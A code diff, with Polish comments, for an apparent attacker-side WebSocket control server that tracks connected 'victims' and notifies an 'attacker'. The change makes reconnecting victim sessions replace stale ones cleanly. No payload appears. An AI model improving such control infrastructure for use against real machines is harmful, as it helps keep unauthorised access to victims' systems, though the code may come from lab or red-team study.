@@ -135,6 +135,15 @@ async def victim_endpoint(ws: WebSocket, victim_id_query: str | None = Query(def
     await ws.accept()
 
     victim_id = victim_id_query or f"victim-{id(ws)}"
+
+    # Jeśli victim o tym samym ID już istnieje — zamknij starą sesję
+    if victim_id in victims:
+        old_ws = victims[victim_id]
+        try:
+            await old_ws.close()
+        except Exception:
+            pass
+
     victims[victim_id] = ws
     print(f"[+] Victim połączony: {victim_id} (aktywnych: {len(victims)})")
 
@@ -172,6 +181,10 @@ async def victim_endpoint(ws: WebSocket, victim_id_query: str | None = Query(def
     except Exception as e:
         print(f"[!] Błąd victim {victim_id}: {e}")
     finally:
-        victims.pop(victim_id, None)
-        print(f"[-] Victim rozłączony: {victim_id} (aktywnych: {len(victims)})")
-        await notify_attacker({"type": "victim_disconnected", "id": victim_id})
+        # Usuń victima TYLKO jeśli to nadal NASZA sesja (nie nadpisana przez reconnect)
+        if victims.get(victim_id) is ws:
+            victims.pop(victim_id, None)
+            print(f"[-] Victim rozłączony: {victim_id} (aktywnych: {len(victims)})")
+            await notify_attacker({"type": "victim_disconnected", "id": victim_id})
+        else:
+            print(f"[-] Stara sesja victima {victim_id} zamknięta (nowa już istnieje)")
